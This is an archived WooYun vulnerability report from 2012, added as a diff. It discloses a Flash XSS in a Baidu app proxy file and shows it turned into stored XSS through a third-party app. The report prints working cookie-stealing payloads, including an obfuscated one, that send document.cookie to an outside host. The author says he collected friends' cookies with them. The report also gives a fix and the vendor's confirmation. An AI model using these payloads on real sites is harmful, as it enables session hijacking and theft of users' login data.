@@ -1,0 +1,310 @@
+﻿<!doctype html>
+                        <html lang="en">
+                        <head>
+	                        <meta charset="UTF-8">
+	                        <title>		百度应用存储型XSS - Diao丝反射型XSS又一次成高富帅了～  </title>
+	                        <link href="../css/css.css" rel="stylesheet" /> 
+                        </head>
+                        <body> 
+                        <ul><li>标题：		百度应用存储型XSS - Diao丝反射型XSS又一次成高富帅了～  </li><li>作者：		<a href="http://www.wooyun.org/whitehats/gainover">gainover</a> 
+</li><li>提交时间：		2012-06-14 22:27</li></ul>
+                        <div class="con">
+                        <h2>漏洞详情</h2>
+		<h3 class="detailTitle">披露状态：</h3>
+		<p class="detail" style="padding-bottom:0">
+					</p>
+		<p class="detail">
+									2012-06-14：	细节已通知厂商并且等待厂商处理中<br/>
+									2012-06-15：	厂商已经确认，细节仅向厂商公开<br/>
+									2012-06-25：	细节向核心白帽子及相关领域专家公开<br/>
+									2012-07-05：	细节向普通白帽子公开<br/>
+									2012-07-15：	细节向实习白帽子公开<br/>
+									2012-07-29：	细节向公众公开<br/>
+					</p>
+		<h3 class="detailTitle">简要描述：</h3>
+
+		<p class="detail">感谢在zone里交流的时候，random_的一个回复，给了我灵感～ ，他的原帖是：http://tmxk.org/thread-498-1-1.html， 但是这个帖子里，所得到的是应用自己网站的cookies，那么我们能不能跨域获取百度的cookies呢？ 答案是可以，见详情：<br />
+<br />
+危害是: 百度应用,可从搜索入口，主页收藏处入口等处进入，流量大，而且攻击隐蔽，因而会导致大量cookies信息泄漏。<br />
+<br />
+---------------<br />
+<br />
+BTW，牢骚一下，以前俺举报某个的百度应用赤裸裸的刷流量，最后那开发者竟然都没受什么惩罚，太黑了，白白的愤青了一把。<br />
+<br />
+---------------</p>
+
+				
+						<h3 class="detailTitle">详细说明：</h3>
+		
+			<p class="detail">1. 首先存在安全风险的是iframe类型的应用。<br />
+<br />
+<br />
+<br />
+2. 该类应用可以加载开发者自己的iframe.<br />
+<br />
+<br />
+<br />
+3. 这看起来合情合理，毕竟iframe有域的控制。开发者无发跨域获取到百度的cookies信息。<br />
+<br />
+<br />
+<br />
+4. 但是，如果app.baidu.com 域名下存在一个 含有XSS缺陷的文件呢？ 情况就不一样了。<br />
+<br />
+<br />
+<br />
+5. 常规XSS，估计被扫描器扫描的差不多了，加上浏览器的XSS过滤器，找到Dom类型的也几乎不可能了，还是拿FLASH开刀。<br />
+<br />
+<br />
+<br />
+6. filetype:swf site:app.baidu.com<br />
+<br />
+<br />
+<br />
+7. 找到以下flash文件。http://app.baidu.com/static/12161058/appweb/flash/APPProxy.swf<br />
+<br />
+<br />
+<br />
+8. 之前给你们提交过FLASH XSS的。 ( <a target="_blank" href="http://www.wooyun.org/bugs/wooyun-2012-07177">WooYun: 播放器代码编写未考虑安全问题导致跨站 [继续FLASH]</a> ),因此分析过程我也不多说了。 <br />
+<br />
+<br />
+<br />
+9. 直接构造利用代码（chrome 下的测试代码，浏览器兼容的代码后面给出）。<br />
+<br />
+<br />
+<br />
+</p><pre><code>http://app.baidu.com/static/12161058/appweb/flash/APPProxy.swf?logHandler=(function(){if(!window.x){location.href%3d\&#039;http://xsst.sinaapp.com/rcookie.php?cookie%3d\&#039;%2bencodeURIComponent(document.cookie);window.x=1}})()</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+10. 上面的代码，会将百度用户的数据，发送到我网站。<br />
+<br />
+<br />
+<br />
+11. 光是上面，只是一个反射型的XSS。攻击不够隐蔽。<br />
+<br />
+<br />
+<br />
+12. 但是在本文的场景中， 如果我们将利用代码，插入到我们自己的百度应用中呢？<br />
+<br />
+<br />
+<br />
+这个反射型的XSS，将会华丽的转身，变为存储型XSS。<br />
+<br />
+<br />
+<br />
+屌丝就是这样变高富帅的！！！！！！！！<br />
+<br />
+<br />
+<br />
+13. 这里我选择我一个用户量十分小的百度应用。（仅测试）<br />
+<br />
+<br />
+<br />
+在应用末尾加上下面的代码 (兼容Chrome 和 IE 等...)。<br />
+<br />
+<br />
+<br />
+</p><pre><code>&lt;script&gt;<br />
+var IF=&#039;&lt;iframe src=&quot;http://app.baidu.com/static/12161058/appweb/flash/APPProxy.swf?logHandler=(function(){if(!window.x){location.href%3d\&#039;http://xsst.sinaapp.com/rcookie.php?cookie%3d\&#039;%2bencodeURIComponent(document.cookie)%2b\&#039;%26refer%3d=\&#039;%2bencodeURIComponent(location.href);window.x=1}})()&quot;&gt;&lt;/iframe&gt;&#039;;<br />
+var UA = navigator.userAgent.toLowerCase();<br />
+if(UA.indexOf(&quot;webkit&quot;)&gt;-1){<br />
+	//chrome, nothing to do<br />
+}else{<br />
+	//ie &amp; ff<br />
+	IF=&#039;&lt;iframe src=&quot;http://app.baidu.com/static/12161058/appweb/flash/APPProxy.swf?logHandler=(function(){if(!window.x){location.href=String.fromCharCode(106,97,118,97,115,99,114,105,112,116,58,34,60,104,116,109,108,62,60,98,111,100,121,62,60,105,102,114,97,109,101,32,105,100,61,39,99,105,39,62,60,47,105,102,114,97,109,101,62,60,115,99,114,105,112,116,62,100,111,99,117,109,101,110,116,46,103,101,116,69,108,101,109,101,110,116,66,121,73,100,40,39,99,105,39,41,46,115,114,99,61,92,39,104,116,116,112,58,47,47,120,115,115,116,46,115,105,110,97,97,112,112,46,99,111,109,47,114,99,111,111,107,105,101,46,112,104,112,63,99,111,111,107,105,101,61,92,39,43,101,110,99,111,100,101,85,82,73,67,111,109,112,111,110,101,110,116,40,100,111,99,117,109,101,110,116,46,99,111,111,107,105,101,41,59,60,92,47,115,99,114,105,112,116,62,60,47,98,111,100,121,62,60,47,104,116,109,108,62,34);window.x=1}})()&quot;&gt;&lt;/iframe&gt;&#039;;<br />
+}	<br />
+document.write(IF);<br />
+&lt;/script&gt;</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+14. 接着，我用自己的小号进行访问，当然还将应用发送给了一些朋友访问。<br />
+<br />
+<br />
+<br />
+</p><p class="detail"><a href="../images/142156063c1913494ded8f261595f36ccd48a04f.jpg" target="_blank"><img src="../images/142156063c1913494ded8f261595f36ccd48a04f.jpg" alt="" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+15. 最后，我们就在接受cookies的页面，可以看到得到的cookies数据。<br />
+<br />
+<br />
+<br />
+以下是我收到的cookies, 如果是挂在一个流量大的应用里，获取到的cookies肯定更多了<br />
+<br />
+<br />
+<br />
+</p><p class="detail"><a href="../images/1421533270bbde9e21012deb31ebfe5d732a3966.jpg" target="_blank"><img src="../images/1421533270bbde9e21012deb31ebfe5d732a3966.jpg" alt="" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+16. 可见，一个反射型XSS，特别是一个FLASH 反射型XSS，在这种场景下，危害是巨大的，给自己的应用加恶意代码，可能不太合适。我们当然还有其它的方式。例如，黑掉别人应用所在服务器（已经尝试过一次）或者是应用本身存在存储型XSS的时候，那么他人的应用就成为了我们获取cookies的傀儡。<br />
+<br />
+<br />
+<br />
+<br />
+<br />
+17.  至于获取了这些cookies，可以进一步做什么，就不是本文的演示范围了。<br />
+<br />
+<br />
+<br />
+18. 最后是一个总结。<br />
+<br />
+<br />
+<br />
+</p><p class="detail"><a href="../images/142208220e96672690e78badb980124ddb610dc5.jpg" target="_blank"><img src="../images/142208220e96672690e78badb980124ddb610dc5.jpg" alt="" width="600"/></a></p><p class="detail"><br />
+<br />
+ </p>
+				
+									<h3 class="detailTitle">漏洞证明：</h3>
+
+			<p class="detail">以上测试代码，在WIN7 / ie+chrome下进行测试成功。<br />
+<br />
+<br />
+<br />
+由于百度应用可以从搜索入口，首页收藏入口等地进入，使用量自然大。<br />
+<br />
+<br />
+<br />
+因此，此漏洞，还可被有心的第三方开发者用于收集个人信息。<br />
+<br />
+<br />
+<br />
+另外，就是攻击十分隐蔽，普通应用使用者，完全无法知道自己的登录信息，已经被他人获取。 </p>
+
+									<h3 class="detailTitle">修复方案：</h3>
+			<p class="detail">iframe一层可以保证安全，但是如果iframe里再iframe一次，就说不一定了，因此要严格控制同域下的文件安全性。<br />
+<br />
+<br />
+<br />
+对app.baidu.com 域名下。<br />
+<br />
+<br />
+<br />
+flash文件代码需严格审查，对其中调用JS函数的接口部分进行严格过滤，防止此类问题的产生。 </p>
+										<h3 class="detailTitle">版权声明：转载请注明来源 <a style="font-weight:normal" href="http://www.wooyun.org/whitehats/gainover" title="gainover">gainover</a>@<a style="font-weight:normal" href="http://www.wooyun.org/bugs/wooyun-2010-08318" title="百度应用存储型XSS - Diao丝反射型XSS又一次成高富帅了～">乌云</a></h3>
+		<hr align="center"/>
+
+				
+			<h2>漏洞回应</h2>
+			
+			
+															<h3 class="detailTitle">厂商回应：</h3>
+						<p class="detail">危害等级：高</p>
+						<p class="detail">漏洞Rank：10 </p>
+													<p class="detail">确认时间：2012-06-15 12:05</p>
+												<h3 class="detailTitle">厂商回复：</h3>				
+						<p class="detail">感谢提交，用一个页面包含一个存储型xss链接，在利用php文件接收。其实最根本的原因还是起初的反射型XSS,这只是其中一种利用方法。对于根本问题，我们会尽快修复</p>
+					
+
+					
+					
+					<h3 class="detailTitle">最新状态：</h3>
+
+											<p class="detail">暂无</p>
+					
+
+							
+					
+		
+<hr align="center" />
+<script type="text/javascript">
+var bugid="8318";
+var bugRating="-3";
+var myRating="";
+var ratingCount="2";
+
+
+
+function ShowBugRating(k){
+	var ratingItems=$(".myrating span");
+	$.each(ratingItems,function(i,n){
+		var nk=parseInt($(n).attr("rel"));
+		if(nk<=k){
+			$(n).addClass("on");
+		}else{
+			$(n).removeClass("on");
+		}
+	});
+	$(".myrating span").hover(
+		function(){
+			$("#ratingShow").html($(this).attr("data-title"));
+		},
+		function(){
+			$("#ratingShow").html("");
+		}
+	);
+}
+$(document).ready(function(){
+	if(myRating==""){
+		var ratingItems=$(".myrating span");
+		$(".myrating span").hover(
+			function(){
+				$(this).addClass("hover");
+				var k=parseInt($(this).attr("rel"));
+				$.each(ratingItems,function(i,n){
+					var nk=parseInt($(n).attr("rel"));
+					if(nk<k) $(n).addClass("on");
+					if(nk>k) $(n).removeClass("on");
+				});
+				$("#ratingShow").html($(this).attr("data-title"));
+			},
+			function(){
+				$(this).removeClass("hover");
+				if($("#myRating").val()==""){
+					$.each(ratingItems,function(i,n){
+						$(n).removeClass("on");
+					});
+				}
+				$("#ratingShow").html("");
+			}
+		);
+
+		$(".myrating span").click(function(){
+			var rating=$(this).attr("rel");
+			var k=parseInt($(this).attr("rel"));
+			$.post("/ajaxdo.php?module=bugrating",{"id":bugid,"rating":rating,"token":$("#token").val()},function(re){
+				//消除操作绑定
+				$(".myrating span").unbind();
+				re=parseInt(re);
+				switch(re){
+					case 1:
+						$("#ratingShow").html("评分成功");
+						$("#ratingSpan").html(parseInt($("#ratingSpan").html())+1);
+						$.each(ratingItems,function(i,n){
+							var nk=parseInt($(n).attr("rel"));
+							if(nk<=k){
+								$(n).addClass("on");
+							}else{
+								$(n).removeClass("on");
+							}
+						});
+						ShowBugRating(rating);
+						break;
+					case 2:
+						$("#ratingShow").html("请先登录");
+						break;
+					case 4:
+						$("#ratingShow").html("已对此漏洞进行过评分");
+						break;
+					case 6:
+						$("#ratingShow").html("不能对自己发布的漏洞进行评分");
+						break;
+					default:break;
+				}
+			});
+		});
+	}else{
+		if(ratingCount>2){
+			ShowBugRating(bugRating);
+		}else{
+			ShowBugRating(-3);
+		}
+	}
+});
+
+</script>
+<h3 class="detailTitle">漏洞评价：</h3>
+                        </div>
+                        </body>
+                        </html>
